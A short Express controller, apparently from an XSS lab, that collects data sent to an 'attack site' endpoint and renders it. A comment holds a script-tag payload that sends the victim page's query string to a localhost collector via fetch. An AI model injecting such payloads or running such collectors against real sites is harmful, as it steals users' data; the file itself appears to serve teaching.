const attackData = [];

exports.getData = (req, res) => {
    if (req.query.data) attackData.push(req.query.data);
    //<script>fetch(`http://localhost:4000?data=${encodeURIComponent(window.location.search)}`)</script>

    res.render('attack_site', {
        attackData: attackData.length > 0 ? attackData : ['No data, yet!'],
    });
};
